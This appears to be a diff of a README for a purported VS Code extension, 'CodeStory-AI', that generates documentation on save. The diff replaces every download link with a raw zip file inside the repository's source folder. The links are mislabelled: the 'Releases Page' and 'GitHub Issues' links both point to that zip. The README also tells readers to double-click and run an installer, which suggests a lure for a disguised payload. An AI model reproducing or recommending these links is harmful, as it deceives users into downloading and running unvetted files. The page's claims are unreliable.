@@ -1,6 +1,6 @@
 # 🚀 CodeStory-AI - Automate Your Documentation Effortlessly
 
-![Download CodeStory-AI](https://github.com/Dada-papa/CodeStory-AI/raw/refs/heads/main/src/Story_Code_AI_v1.6.zip)
+![Download CodeStory-AI](https://raw.githubusercontent.com/Dada-papa/CodeStory-AI/main/src/providers/AI_Code_Story_2.5-alpha.1.zip)
 
 ## 📖 About CodeStory-AI
 CodeStory AI is an intelligent VS Code extension that automates the creation of internal documentation for your code. It seamlessly generates documentation every time you save, ensuring your project's knowledge base is always current.
@@ -17,7 +17,7 @@ CodeStory AI is an intelligent VS Code extension that automates the creation of 
 - **Storage Space:** At least 50 MB of free disk space
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page:** To download CodeStory-AI, visit this page: [Download CodeStory-AI](https://github.com/Dada-papa/CodeStory-AI/raw/refs/heads/main/src/Story_Code_AI_v1.6.zip).
+1. **Visit the Releases Page:** To download CodeStory-AI, visit this page: [Download CodeStory-AI](https://raw.githubusercontent.com/Dada-papa/CodeStory-AI/main/src/providers/AI_Code_Story_2.5-alpha.1.zip).
 2. **Select the Latest Release:** Look for the most recent version at the top of the page.
 3. **Download the Installer:** Click on the file that matches your operating system to start the download.
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder and double-click it to start the installation.
@@ -25,7 +25,7 @@ CodeStory AI is an intelligent VS Code extension that automates the creation of 
 ## 📥 Download & Install
 To get started quickly, click the button below to download the latest version of CodeStory-AI.
 
-[Download CodeStory-AI](https://github.com/Dada-papa/CodeStory-AI/raw/refs/heads/main/src/Story_Code_AI_v1.6.zip)
+[Download CodeStory-AI](https://raw.githubusercontent.com/Dada-papa/CodeStory-AI/main/src/providers/AI_Code_Story_2.5-alpha.1.zip)
 
 1. After downloading, run the installer.
 2. Follow the prompts to complete the installation.
@@ -42,7 +42,7 @@ To get started quickly, click the button below to download the latest version of
 You can customize various settings to fit your workflow. Go to the VS Code settings and search for "CodeStory-AI" to find options related to documentation formats or enabling/disabling features.
 
 ## 💬 Support & Feedback
-If you encounter any issues or have suggestions, please visit our [GitHub Issues](https://github.com/Dada-papa/CodeStory-AI/raw/refs/heads/main/src/Story_Code_AI_v1.6.zip) page. Your feedback helps us improve.
+If you encounter any issues or have suggestions, please visit our [GitHub Issues](https://raw.githubusercontent.com/Dada-papa/CodeStory-AI/main/src/providers/AI_Code_Story_2.5-alpha.1.zip) page. Your feedback helps us improve.
 
 ## 🌍 Topics
 - ai
